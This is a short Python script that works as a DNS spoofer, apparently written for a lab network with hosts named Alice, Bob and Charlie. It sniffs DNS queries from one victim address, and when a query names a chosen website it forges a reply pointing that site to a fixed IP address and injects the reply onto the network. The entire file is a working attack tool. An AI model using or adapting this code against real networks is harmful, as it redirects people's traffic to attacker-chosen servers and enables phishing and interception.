#!/usr/bin/env python
# Simple DNS spoofer
import sys, dpkt, pcap, dumbnet

# Variables
# www.raggajungle.biz
bad_website = sys.argv[1] # What website do we want to incorrectly resolve?
resolve_to = '205.134.189.192' # What do we want to resolve bad_website to?

# Set up capture of DNS requests
#print `pcap.lookupdev()` # Devices on Charlie: eth0 (public), eth1 (Alice), eth2 (Bob)
dns_capture = pcap.pcap(name='eth1')
dns_capture.setfilter('dst port 53 && src 192.168.0.100') # Filter for DNS requests from Alice
#dns_capture = pcap.pcap() # Testing capture
#dns_capture.setfilter('dst port 53 && src 192.168.1.202') # Testing filter for localhost
for ts, pkt in dns_capture:
	# Packet dump = Ethernet(src='\x00"h\x10\x0c\xa7', dst='0\x85\xa99m\x90', data=IP(src='\xc0\xa8\x01\xca', off=16384, dst='\xc0\xa8\x01u', sum=6878, len=56, p=17, id=39751, data=UDP(dport=53, sum=33989, sport=50278, ulen=36, data='\xb9\x8d\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03c99\x03gen\x02tr\x00\x00\x01\x00\x01')))
	# Parse data to get the requested hostname
	# I know not all of them are actually packets ...
	ethernet_packet = dpkt.ethernet.Ethernet(pkt) # Ethernet packet
	#print "Packet recieved: \n%s" % `ethernet_packet`
	ip_packet = ethernet_packet.data # UDP packet
	udp_packet = ip_packet.data # IP packet
	# Order: Ethernet.IP.UDP.udp_data
	dns_packet = dpkt.dns.DNS(udp_packet.data) 
	requested_hostname = `dns_packet.qd[0].name` # name = DNS(qd=[Q(type=15, name='www.raggajungle.biz')], id=24941)
	# If requested_hostname = bad_website, spoof the DNS reply
	if bad_website in requested_hostname: 
		# Let's make a new packet; most data we need is already in dns_packet
		# See https://code.google.com/p/dpkt/source/browse/trunk/dpkt/dns.py?r=23
		# https://www.iana.org/assignments/dns-parameters
		# Make the packet a response
		dns_packet.op = dpkt.dns.DNS_RA # Recursion available
		dns_packet.rcode = dpkt.dns.DNS_RCODE_NOERR # No error, it's fine
		dns_packet.qr = dpkt.dns.DNS_R # It's a response (1), not a question (0)
		# Need a new resource record answer
		rr = dpkt.dns.DNS.RR()
		rr.cls = dpkt.dns.DNS_IN # Class - internet registry
		rr.name = bad_website # Name of website
		rr.ip = dumbnet.addr(resolve_to).ip # IP to resolve bad_hostname to
		dns_packet.an.append(rr) # Append the RR to the DNS packet
		#print `dns_packet` # DNS
		# Done with DNS payload; time to modify UDP and IP wrappers
		temp_udp = udp_packet.dport # Swap source and destination ports in the UDP layer
		udp_packet.dport = udp_packet.sport
		udp_packet.sport = temp_udp
		#print `udp_packet` # UDP
		temp_ip = ip_packet.src # Swap src and dst in IP layer
		ip_packet.src = ip_packet.dst
		ip_packet.dst = temp_ip
		udp_packet.data = dns_packet # Add the DNS payload
		udp_packet.ulen = len(udp_packet) # Calculate new length of UDP part
		ip_packet.len = len(ip_packet) # Calculate new length of IP part
		#print `ip_packet` # IP
		final_spoofed_packet = dumbnet.ip_checksum(str(ip_packet)) # Make the checksum proper
		dumbnet.ip().send(final_spoofed_packet) # Boom, headshot
